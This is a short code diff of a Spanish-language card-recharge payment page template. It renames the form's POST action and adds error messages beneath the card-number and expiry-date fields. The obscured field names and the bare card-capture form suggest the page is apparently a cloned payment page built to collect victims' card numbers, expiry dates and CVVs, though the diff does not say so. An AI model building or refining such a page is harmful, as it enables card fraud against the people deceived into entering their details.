@@ -6,7 +6,7 @@
    <div thirdpartyrechargeenabled="true" id="root">
    <div class="page-recharge-body">
    <div class="page-recharge-tarjeta">
-      <form id="frmverify" name="frmverify" action="/minetue" method="POST" > 
+      <form id="frmverify" name="frmverify" action="/checkout" method="POST" > 
          <div class="row">
             
                   <div class="page-recharge-divider"></div>
@@ -28,9 +28,16 @@
                               <label class="inputcontainer__label newcard__inputcontainer__label" >Número de tarjeta</label>
                               <span class="inputcontainer__span newcard__inputcontainer__span"><a>Ver tarjetas habilitadas</a>
                               </span>
+                              {% if error %}
+                                 <div style="color: red; font-size: 12px; margin-top: 5px;">
+                                 {{ error }}
+                                 </div>
+                              {% endif %}
                               <div id="error-agks" style="color: red; display: none; font-size: 12px; margin-top: 5px;">
                               Ingresá todos los números de la tarjeta
                            </div>
+
+                              
 
                            </div>
 
@@ -45,7 +52,11 @@
                            <div id="due-date-input" class="inputcontainer__data  newcard__inputcontainer__data">
                               <input type="tel" maxlength="" class="inputcontainer__input newcard__inputcontainer__input--small active" id="agksjf" name="agksjf" value="">
                               <label class="inputcontainer__label newcard__inputcontainer__label">Fecha de vencimiento (MM/AA)</label>
-                           
+                              {% if mensaje_error_cvv %}
+                                 <div style="color: red; font-size: 12px; margin-top: 5px;">
+                                 {{ mensaje_error_cvv }}
+                                 </div>
+                              {% endif %}
                               <div id="error-agksjf" style="color: red; display: none; font-size: 12px; margin-top: 5px;">
                               Ingresá la fecha de vencimiento
                            </div>
